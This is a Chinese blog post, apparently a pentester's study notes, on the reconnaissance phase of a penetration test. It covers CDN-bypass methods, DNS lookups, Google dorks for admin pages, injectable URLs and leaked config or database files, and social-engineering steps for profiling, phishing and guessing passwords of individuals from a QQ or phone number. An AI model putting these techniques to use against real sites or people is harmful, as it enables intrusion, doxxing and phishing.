anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">October 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">August 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">15</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">July 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/08/"><span class="card-archive-list-date">August 2021</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2020/08/"><span class="card-archive-list-date">August 2020</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>渗透测试</span></a></span></div></div><h1 class="post-title" itemprop="name headline">渗透测试全流程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-10-06T09:09:05.972Z" title="Updated 2023-10-06 17:09:05">2023-10-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://frankcao3.github.io/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"><header><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" tabindex="-1" itemprop="url">渗透测试</a><h1 id="CrawlerTitle" itemprop="name headline">渗透测试全流程</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">ccb</span><time itemprop="dateCreated datePublished" datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time><time itemprop="dateCreated datePublished" datetime="2023-10-06T09:09:05.972Z" title="Updated 2023-10-06 17:09:05">2023-10-06</time></header><h1 id="渗透测试全流程"><a href="#渗透测试全流程" class="headerlink" title="渗透测试全流程"></a>渗透测试全流程</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/290055.html">https://www.freebuf.com/articles/web/290055.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/360173.html">https://www.freebuf.com/vuls/360173.html</a></p>
+<p>从旁观者的角度了解整个WEB应用乃至整个目标的全貌，但是资产是收集不完的，可以边收集，边进行一定程度的测试。信息收集最小的粒度应是<strong>目录</strong>。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">dirbuster</span><br><span class="line">kali自带的一款工具，fuzz很方便</span><br><span class="line"></span><br><span class="line">gorailgun</span><br><span class="line">一款自动化做的非常好的工具，信息收集全过程都能用上</span><br><span class="line"></span><br><span class="line">OneForALL</span><br><span class="line">一款子域名收集工具，收集接口非常多，比自己收藏一大堆网址方便，收集子域自动去重，去无效，并进行拓展</span><br><span class="line"></span><br><span class="line">layer子域名挖掘机和subdomainbrute</span><br><span class="line">拉满线程去跑子域名的工具，都是老朋友见面，不用多说了</span><br><span class="line"></span><br><span class="line">一些信息收集的网站</span><br><span class="line">http://www.webscan.cc/                 C端同服扫描</span><br><span class="line">https://www.tianyancha.com/                 天眼查</span><br><span class="line">https://fofa.so/                   网络空间搜索引擎</span><br><span class="line">http://www.yunsee.cn/               云悉WEB资产搜集</span><br><span class="line">https://www.shodan.io/              shodan搜索引擎</span><br><span class="line">https://www.zoomeye.org/                知道创宇眼</span><br><span class="line">http://www.dianhua.cn/                     电话帮</span><br><span class="line">http://haoma.sogou.com/rz/              搜狗号码通</span><br><span class="line">http://haoma.baidu.com/query          百度号码认证</span><br><span class="line">http://www.gogoqq.com/          非好友情况如何查看QQ空间</span><br><span class="line">http://whitepages.com              房产登记信息查询</span><br><span class="line">http://tool.chinaz.com/                    站长之家</span><br><span class="line">http://www.webscan.cc/                     在线工具</span><br><span class="line">http://www.882667.com                 查询IP所在位置</span><br><span class="line">http://www.yunsee.cn         云悉在线WEB指纹CMS识别平台</span><br><span class="line">http://whatweb.bugscaner.com/look/         指纹识别</span><br><span class="line"></span><br><span class="line">临时邮箱</span><br><span class="line">https://temp-mail.org/zh/</span><br><span class="line">https://www.linshiyouxiang.net/</span><br><span class="line">https://www.guerrillamail.com/zh/</span><br><span class="line">https://www.moakt.com/zh</span><br><span class="line">http://links.icamtech.com/</span><br><span class="line"></span><br><span class="line">在线C段/同服(旁站)</span><br><span class="line">https://rapiddns.io/sameip</span><br><span class="line">http://www.webscan.cc/</span><br><span class="line">https://chapangzhan.com</span><br><span class="line">https://phpinfo.me/bing.php</span><br><span class="line"></span><br><span class="line">漏洞库</span><br><span class="line">https://www.cnvd.org.cn/</span><br><span class="line">https://www.securityfocus.com/</span><br><span class="line">https://packetstormsecurity.com/</span><br><span class="line">https://www.exploit-db.com/</span><br><span class="line">https://cxsecurity.com/</span><br><span class="line">https://shuimugan.com/</span><br><span class="line">http://0day.today/</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-目标确认"><a href="#1-目标确认" class="headerlink" title="1. 目标确认"></a>1. 目标确认</h3><h4 id="1-1-域名注册信息"><a href="#1-1-域名注册信息" class="headerlink" title="1.1 域名注册信息"></a>1.1 域名注册信息</h4><p><strong>通过如下步骤确认目标所有者信息：</strong></p>
+<p>Whois 目标域名&#x2F;主机名：whois <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a><br>解析目标域名&#x2F;主机名的IP地址：dig +short <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a><br>获取域名的详细解析过程：dig +trace <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a><br>后续用于字典制作和进一步收集目标信息的基础</p>
+<p><strong>获取真实IP：</strong></p>
+<p>浏览器切换手机模式，可能是真实ip，公众号、小程序中的资产也可能对应真实ip。</p>
+<p><strong>验证是否存在CDN</strong></p>
+<p>方法1：</p>
+<p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a target="_blank" rel="noopener" href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
+<p>方法2：</p>
+<p>试用nslookup进行检测，如果返回域名解析对应多个IP，那么多半是试用了CDN.<br>nslookup <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a></p>
+<p>方法3:</p>
+<p>在线工具查看是否存在CDN，可以参考以下站点:<br><a target="_blank" rel="noopener" href="http://www.cdnplanet.com/tools/cdnfinder">http://www.cdnplanet.com/tools/cdnfinder</a><br><a target="_blank" rel="noopener" href="http://www.ipip.net/ip.html">http://www.ipip.net/ip.html</a></p>
+<p>&#x3D;&#x3D;<strong>绕过CDN查找网站真实IP</strong>&#x3D;&#x3D;</p>
+<p><strong>1. 查询历史DNS记录(ip的历史解析域名，域名的历史解析ip)</strong></p>
+<p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：<br><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><a target="_blank" rel="noopener" href="https://x.threatbook.cn/">https://x.threatbook.cn/</a><br><a target="_blank" rel="noopener" href="https://censys.io/ipv4?q=baidu.com">https://censys.io/ipv4?q=baidu.com</a><br>非常牛逼的IP记录站，还能分析内链之类找出可能的IP地址，此外还会记录历史。<br><a target="_blank" rel="noopener" href="http://viewdns.info/">http://viewdns.info</a></p>
+<p>同样是个令站长十分蛋疼的DNS历史记录网站，记录了几年内的更改记录。<br><a target="_blank" rel="noopener" href="http://securitytrails.com/">http://securitytrails.com</a><br><a target="_blank" rel="noopener" href="https://site.ip138.com/">https://site.ip138.com/</a></p>
+<p>庞大的DNS历史数据库，可以查出几年内网站用过的IP、机房信息等。<br><a target="_blank" rel="noopener" href="http://iphostinfo.com/">http://iphostinfo.com</a><br>注意：这个网站可以遍历FTP、MX记录和常见二级域名，有些站长喜欢把邮箱服务也放在自己主机上，侧面泄露了真实的IP地址，通过这个网站可以进行检查。</p>
+<p><strong>2. 查询子域名</strong>（捷径，去众测平台、github找官方发布过的）</p>
+<p>注意：有可能有些站长只给主站或流量大的子域名做了CDN,而很多子域名都是和主站在同一台服务器上，或者 C段中，这样可以通过子域名来辅助找到网站真实IP<br>爆破子域名:</p>
+<p><strong>主动式</strong></p>
+<p>layer子域名挖掘机（字典要自己丰富）<br><a target="_blank" rel="noopener" href="http://z.zcjun.com/(%E5%9C%A8%E7%BA%BF%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98)">http://z.zcjun.com/(在线子域名挖掘)</a><br>fuzzdomain 很好用，速度快</p>
+<p><strong>被动式</strong></p>
+<p>搜索引擎拿<strong>子域名、旁站（同IP网站）、C段</strong>：</p>
+<p>可用搜索引擎语法查询子域名：<br>谷歌、百度、bing、搜狗(搜索微信文章)、雅虎等略有差异</p>
+<p>详细用法:<br>（1）site: &#x3D;主域名,搜索其主要域名下面的子域名<br>（2）allintext: &#x3D; 搜索文本,但不包括网页标题和链接<br>（3）allinlinks: &#x3D; 搜索链接, 不包括文本和标题。<br>（4）related:URL &#x3D; 列出于目标URL地址有关的网页。<br>（5）link:URL &#x3D; 列出到链接到目标URL的网页清单。<br>（6）使用“-”去掉不想看的结果，例如site:<a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com</a> <a target="_blank" rel="noopener" href="http://-image.baidu.com/">http://-image.baidu.com</a></p>
+<p>百度语法：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/k0xx/p/12794452.html">https://www.cnblogs.com/k0xx/p/12794452.html</a></p>
+<p>谷歌语法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187">https://blog.csdn.net/u012991692/article/details/82937100?biz_id=102&amp;utm_term=Googlehack&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-82937100&amp;spm=1018.2118.3001.4187</a></p>
+<p>GHDB：<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p>
+<p><strong>3. 资产搜索(旁站\C段\特征):</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.shodan.io(资产相关或特征值关键字爆ip)/">https://www.shodan.io(资产相关或特征值关键字爆ip)</a><br><a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so</a><br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/">https://www.zoomeye.org/</a><br><a target="_blank" rel="noopener" href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a> （云悉在线资产平台)<br><a target="_blank" rel="noopener" href="http://subdomain.chaxun.la/">http://subdomain.chaxun.la</a> （查询啦）<br><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a><br><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a target="_blank" rel="noopener" href="https://duckduckgo.com/">https://duckduckgo.com</a> （一个不会存储你个人信息的搜索引擎）<br><a target="_blank" rel="noopener" href="https://crt.sh/%EF%BC%88SSL%E8%AF%81%E4%B9%A6%E6%9F%A5%E8%AF%A2%EF%BC%89">https://crt.sh/（SSL证书查询）</a><br><a target="_blank" rel="noopener" href="https://icp.aizhan.com/(%E5%9F%9F%E5%90%8D%E5%A4%87%E6%A1%88)">https://icp.aizhan.com/(域名备案)</a></p>
+<p><strong>4. 对方服务器给自己发邮件暴露IP</strong></p>
+<p><strong>5. 使用其他地区的服务器ping网站，当地可能没做CDN</strong></p>
+<p><strong>6. 借助漏洞</strong></p>
+<p>若存在web漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如xss、ssrf、命令执行反弹shell等。</p>
+<h4 id="1-2-DNS信息查询"><a href="#1-2-DNS信息查询" class="headerlink" title="1.2 DNS信息查询"></a>1.2 DNS信息查询</h4><p><strong>目的:</strong></p>
+<p>注册者名称及邮箱,再反查其他域名<br>手机号 座机号<br>ASN号</p>
+<p>地址在线DNS信息查询工具<br><a target="_blank" rel="noopener" href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><a target="_blank" rel="noopener" href="https://www.dnsdb.io/">https://www.dnsdb.io</a> （DNS搜索引擎）<br><a target="_blank" rel="noopener" href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com</a><br><a target="_blank" rel="noopener" href="http://whois.nawang.cn/">http://whois.nawang.cn/</a><br><a target="_blank" rel="noopener" href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br><a target="_blank" rel="noopener" href="https://whois.west.cn/">https://whois.west.cn/</a><br><a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com/</a> (站长之家)<br><a target="_blank" rel="noopener" href="https://www.tianyancha.com/">https://www.tianyancha.com/</a> （天眼查）<br><a target="_blank" rel="noopener" href="http://www.gsxt.gov.cn/index.html">http://www.gsxt.gov.cn/index.html</a> （国家企业信用信息系统）<br><a target="_blank" rel="noopener" href="http://www.beianbeian.com/">http://www.beianbeian.com/</a> （ICP备案查询）</p>
+<h4 id="1-3-测试域传送漏洞"><a href="#1-3-测试域传送漏洞" class="headerlink" title="1.3 测试域传送漏洞"></a>1.3 测试域传送漏洞</h4><p>域传送是一种DNS事务，用于在主从服务器间复制DNS记录。虽然如今已经很少见主机会开启，但是还是应该确认一下。一旦存在域传送漏洞，就意味着你获取了整个域下面所有的记录。<br>dnsrecon -d <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a><br>dnsenum <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a> 包含自动检测域传送漏洞<br>dnsenum还能爆破子域名，功能比较多，详见：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263851/article/details/108955964">https://blog.csdn.net/weixin_43263851/article/details/108955964</a></p>
+<h4 id="1-4-业务相关"><a href="#1-4-业务相关" class="headerlink" title="1.4 业务相关"></a>1.4 业务相关</h4><p>github泄露：<br>in:name test #仓库标题搜索含有关键字 SpringCloud<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>stars:&gt;3000 test #stars数量大于3000的搜索关键字<br>stars:1000..3000 test #stars数量大于1000小于3000的搜索关键字<br>forks:&gt;1000 test #forks数量大于1000的搜索关键字<br>forks:1000..3000 test #forks数量大于1000小于3000的搜索关键字<br>size:&gt;&#x3D;5000 test #指定仓库大于5000k(5M)的搜索关键字<br>pushed:&gt;2019-02-12 test #发布时间大于 2019-02-12的搜索关键字<br>created:&gt;2019-02-12 test #创建时间大于2019-02-12的搜索关键字<br>user:test #用户名搜素<br>license:apache-2.0 test #明确仓库的 LICENSE 搜索关键字<br>language:java test #在java语言的代码中搜索关键字<br>user:test in:name test #组合搜索,用户名test的标题含有test的</p>
+<p>网盘泄露：<br>各种云网盘，详见虫部落搜索:<br><a target="_blank" rel="noopener" href="http://magnet.chongbuluo.com/">http://magnet.chongbuluo.com</a><br>敏感路径扫描：<br><a target="_blank" rel="noopener" href="https://github.com/ring04h/weakfilescan">https://github.com/ring04h/weakfilescan</a></p>
+<h3 id="2-OSINT-公开情报收集"><a href="#2-OSINT-公开情报收集" class="headerlink" title="2. OSINT 公开情报收集"></a>2. OSINT 公开情报收集</h3><h4 id="2-1-社工技巧"><a href="#2-1-社工技巧" class="headerlink" title="2.1 社工技巧"></a>2.1 社工技巧</h4><p><strong>查看注册的网站</strong>：0xreg reg007</p>
+<p>知道账号去已注册的网站找回密码，可以看到打码后的用户名、邮箱、真实姓名等信息，如果运气好没准能从数据包或html中找到未被打码的信息</p>
+<p><strong>可以从这些方面判断用户是否注册过</strong></p>
+<p>找回密码：输入账号，如果进入下一步了则该账号存在</p>
+<p>登录：输入账号和密码，如果提示密码错误，则表示该用户已存在</p>
+<p>注册：填写账号时一般网站会去检测该账号是否已存在，如果已存在则会提示不可重复注册</p>
+<p><strong>知道QQ</strong></p>
+<p>通过QQ邮箱和QQ号搜索支付宝、淘宝账号等其他可能的常用平台<br>去腾讯\新浪微博搜索<br>通过微信搜索<br>查看QQ空间\相册\地区\星座\生日\昵称(后续构建字典以及跨平台搜集)<br>通过说说、留言、日志找到其好友<br>加QQ钓鱼\共同好友\可能认识的人</p>
+<p><strong>知道手机号</strong></p>
+<p>搜索QQ、微信、钉钉等社交账号<br>在比较火的一些APP和网站上注册或忘记密码来判断是否注册过账号<br>查询支付宝、QQ交易账号，尝试输入常见姓氏获取名字(转账到该手机号,会提示输入姓氏验证)<br>通过对方的职业、兴趣找到该领域知名度较高的社交网站反查<br>根据在QQ空间、朋友圈等动态用百度识图识别照片<br>在微博、ins、Twitter、fb、百度贴吧搜索相近关键字，按地域、年龄、男女、用户名等筛选</p>
+<p><strong>留意社交动态</strong></p>
+<p>发布时间线<br>使用什么客户端 iPhone Android还是浏览器<br>针对客户端预先制定exploit<br>注意每一条链接 &#x2F; 图片 &#x2F; 视频链接可能包含用户ID<br>图片可能包含水印，exif可能会有GPS定位和手机类型,图片内容特征<br>视频也有可能有水印暴露社交账号ID,拍摄地点<br>从最早发布的动态看起，会有很大收获<br>一般得到一个账号的密码就相当于得到了其他账号的密码<br>一般人不同账号的用户名都是相同或相近的<br>一般人的社交账号头像用的都是一样的<br>尝试破解社保、公积金账号、身份z号（出生地、生日、星座、派出所代码）</p>
+<p>虫部落快搜之文件搜索:<a target="_blank" rel="noopener" href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a></p>
+<p>qq群、群文件、贴吧论坛、目标自用论坛等社交平台<strong>钓鱼</strong>和<strong>信息泄露</strong>(爬邮箱等信息)</p>
+<p>电子邮件伪造、网络钓鱼<br>下载恶意程序<br>输入敏感信息</p>
+<p>大部分信息可以用来生成密码字典</p>
+<p>对人：说服对方达成一致、恐吓对方（敏感词、漏洞、病毒、权威机构名称、），钓鱼获取信息</p>
+<h4 id="2-2-搜索引擎OSINT"><a href="#2-2-搜索引擎OSINT" class="headerlink" title="2.2 搜索引擎OSINT"></a>2.2 搜索引擎OSINT</h4><p><strong>Google Hacking</strong>(baidu\bing\souhu\github)</p>
+<p>GoogleHacking常用语法</p>
+<p>1、<strong>intext</strong>：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件<br>2、<strong>intitle</strong>： 把网页标题中的某个字符作为搜索的条件<br>3、<strong>cache</strong>： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息<br>4、<strong>filetype&#x2F;ext</strong>： 指定一个格式类型的文件作为搜索对象<br>5、<strong>inurl</strong>： 搜索包含指定字符的URL<br>6、<strong>site</strong>： 在指定的(域名)站点搜索相关内容　　</p>
+<p>GoogleHacking其他语法</p>
+<p>1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索<br>2、or 同时搜索两个或更多的关键字<br>3、link 搜索某个网站的链接 link:<a target="_blank" rel="noopener" href="http://baidu.com即返回所有和baidu做了链接的url/">http://baidu.com即返回所有和baidu做了链接的URL</a><br>4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:<br>google-hacking-databaseGoogleHacking典型用法(<strong>特定资产的万能密码</strong>也要积累)</p>
+<p>管理后台地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class="line">site:http://target.com inurl:login | inurl:admin | inurl:manage</span><br><span class="line">| inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class="line">site:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br></pre></td></tr></table></figure>
+
+<p>上传类漏洞地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:file</span><br><span class="line">site:http://target.com inurl:upload</span><br></pre></td></tr></table></figure>
+
+<p>注入页面：（批量注入工具、结合搜索引擎）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:php?id=</span><br></pre></td></tr></table></figure>
+
+<p>编辑器页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com inurl:ewebeditor</span><br></pre></td></tr></table></figure>
+
+<p>目录遍历漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intitle:index.of</span><br></pre></td></tr></table></figure>
+
+<p>SQL错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot; | intext:”Warning: pg_connect()&quot;</span><br></pre></td></tr></table></figure>
+
+<p>phpinfo()：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:php intitle:phpinfo &quot;published by the PHP Group&quot;</span><br></pre></td></tr></table></figure>
+
+<p>配置文件泄露：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini</span><br></pre></td></tr></table></figure>
+
+<p>数据库文件泄露：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.sql | .dbf | .mdb | .db</span><br></pre></td></tr></table></figure>
+
+<p>日志文件泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.log</span><br></pre></td></tr></table></figure>
+
+<p>备份和历史文件泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar</span><br></pre></td></tr></table></figure>
+
+<p>公开文件泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com filetype:.doc | .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv</span><br></pre></td></tr></table></figure>
+
+<p>邮箱信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intext:@http://target.com</span><br><span class="line">site:http://target.com 邮件</span><br><span class="line">site:http://target.com email</span><br></pre></td></tr></table></figure>
+
+<p>社工信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-3-浏览器实用插件"><a href="#2-3-浏览器实用插件" class="headerlink" title="2.3 浏览器实用插件"></a>2.3 浏览器实用插件</h4><p>Wappalyzer：识别网站使用的中间件及其版本，再去漏洞库和搜索引擎找公开披露的漏洞</p>
+<p>SwitchOmega：快捷切换代理</p>
+<p>shodan：识别开放端口，主机服务等（被动信息搜集）</p>
+<p>hacktools:综合插件,很强大</p>
+<p>firefox渗透便携版version48,工具集成很多</p>
+<p>注意：根据获得服务、中间件信息、编辑器版本、数据库等OSINT去各大漏洞库、搜索引擎找漏洞利用</p>
+<h4 id="2-4-乌云和cnvd"><a href="#2-4-乌云和cnvd" class="headerlink" title="2.4 乌云和cnvd"></a>2.4 乌云和cnvd</h4><p>乌云库\乌云镜像\GHDB\CNVD等公开漏洞库</p>
+<h3 id="3-x3D-x3D-打点-x3D-x3D"><a href="#3-x3D-x3D-打点-x3D-x3D" class="headerlink" title="3. &#x3D;&#x3D;打点&#x3D;&#x3D;"></a>3. &#x3D;&#x3D;打点&#x3D;&#x3D;</h3><p>打点方法</p>
+<p>打点原理</p>
+<h2 id="主动探测"><a href="#主动探测" class="headerlink" title="主动探测"></a>主动探测</h2><p>从管理员和用户的角度了解整个WEB应用乃至整个目标的全貌，主动探测会暴露ip以及留下日志信息，所以要…</p>
